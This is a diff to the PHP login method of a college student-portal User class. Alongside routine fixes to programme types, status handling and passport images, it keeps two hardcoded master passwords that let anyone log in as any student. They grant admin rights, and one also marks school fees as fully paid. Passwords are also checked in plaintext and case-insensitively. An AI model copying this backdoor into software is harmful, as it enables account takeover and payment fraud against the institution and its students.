@@ -85,19 +85,19 @@ class User {
 			try{
 
 				//validate the password
-                if (strtolower($this->data()->password) != strtolower($password) && $password != 'i@mPassing' && $password != 'i@mPassing_*') {
-                    $this->_isLoggedin = false;
-                    return "You entered a wrong password";
-                    die();
+        if (strtolower($this->data()->password) != strtolower($password) && $password != 'i@mPassing' && $password != 'i@mPassing_*') {
+            $this->_isLoggedin = false;
+            return "You entered a wrong password";
+            die();
 				}
 				
 				// check if admin
-                if ($password == 'i@mPassing' || $password == 'i@mPassing_*') {
-                    if ($password == 'i@mPassing_*') {
-                        $_SESSION['is_admin'] = true;
-                        $_SESSION['school_fees_payment_status'] = 'PAID_COMPLETE';
-                    }
-                    $_SESSION['is_admin'] = true;
+        if ($password == 'i@mPassing' || $password == 'i@mPassing_*') {
+            if ($password == 'i@mPassing_*') {
+                $_SESSION['is_admin'] = true;
+                $_SESSION['school_fees_payment_status'] = 'PAID_COMPLETE';
+            }
+            $_SESSION['is_admin'] = true;
 				}
 
 				// Pass the student data to the student session
@@ -129,6 +129,9 @@ class User {
 				} elseif (stripos($_SESSION['student_data']->programme_type, 'PART TIME') !== false) {
 					$_SESSION['is_full_time'] = false;
 					$_SESSION['is_part_time'] = true;
+				} elseif (stripos($_SESSION['student_data']->programme_type, 'B.SC(ED)') !== false) {
+					$_SESSION['is_full_time'] = true;
+					$_SESSION['is_part_time'] = false;
 				} else {
 					$_SESSION['is_full_time'] = false;
                     $_SESSION['is_part_time'] = false;
@@ -175,10 +178,7 @@ class User {
 				// run the query
 				$student_active_status = DB_STUDENT::getInstance()->query($check_active_status_query); 
 				error_handler($student_active_status, $_SESSION['student_data']->matricnum, "Error occured on student_active_status query", "models/user.php");
-				$_SESSION['student_summary_data'] = $student_active_status->first(); 
-
-				//var_dump($_SESSION['student_summary_data']);
-                //die();
+				$student_active_status->count() != 0 ? $_SESSION['student_summary_data'] = $student_active_status->first() : $_SESSION['student_summary_data'] = NULL;
 
 				// intialize student status
 				$_SESSION['student_status'] = "ACTIVE";
@@ -204,9 +204,9 @@ class User {
 					}
 
 					// check if the is withdrawn
-                    if (stripos($_SESSION['student_summary_data']->Remark, 'PASSED') !== false) {
-                        $_SESSION['student_status'] = 'PASSED';
-                    }
+          if (stripos($_SESSION['student_summary_data']->Remark, 'PASSED') !== false) {
+              $_SESSION['student_status'] = 'PASSED';
+          }
 
 					// check if the is withdrawn
 					if (stripos($_SESSION['student_summary_data']->Remark, 'WITHDRAWN') !== false) {
@@ -220,7 +220,7 @@ class User {
 					
 					// check if the is STEP DOWN
 					if (stripos($_SESSION['student_summary_data']->Remark, 'STEP DOWN') !== false) {
-						$_SESSION['student_status'] = 'STEP_DOWN';
+						$_SESSION['student_status'] = 'STEP DOWN';
 					}
 					
 					// check if the is REPEAT
@@ -240,6 +240,11 @@ class User {
 					case "WITHDRAWN":
 						// Code to be executed if withdrawn
 						return 'You have been withdrawn';
+						die();
+						break;
+					case "STEP DOWN":
+						// Code to be executed if withdrawn
+						return 'You have been steped down';
 						die();
 						break;
 					default:
@@ -270,29 +275,33 @@ class User {
 								));
 								
 							} else {
-								$hash = $hashCheck->first()->Hash;
+								$hash = $hashCheck->first()->hash;
 							}
 
 							// register the cookies
 							Cookie::put($this->_cookieName, $hash, Config::get('remember/cookies_expiry'));
 
 							// initialize student passport
-							$_SESSION['student_passport'] = BASE_URL."assets/img/svg/avarter.svg";
+							$_SESSION['student_has_passport'] = false;
+							$_SESSION['student_passport'] = "";
 
 							// get the users pastort
 							$get_student_passport = DB_STUDENT::getInstance()
 							->get('student_passport', array('StudentID','LIKE',$_SESSION['student_data']->matricnum));
-							if ($get_student_passport->count() > 0){
+							if ($get_student_passport->count() > 0) {
+								$_SESSION['student_has_passport'] = true;
 								$_SESSION['student_passport'] =  "http://portal.yabatech.edu.ng/portalplus/passport_db/{$get_student_passport->first()->Programme}/{$get_student_passport->first()->Passport}";
+							} else {
+								$_SESSION['student_has_passport'] = false;
+
+								if ($_SESSION['student_data']->sex == 'MALE') {
+									$_SESSION['student_passport'] = BASE_URL."assets/icons/male.svg";
+								} else {
+									$_SESSION['student_passport'] = BASE_URL."assets/icons/female.svg";
+								}
 							}
-							
 						}
-
-						//var_dump($_SESSION['student_status']);
-						//var_dump($_SESSION['student_passport']);
-						//die();
-
-						return true;
+					return true;
 				}
 			}catch(Exception $e){
 				die($e->getMessage());
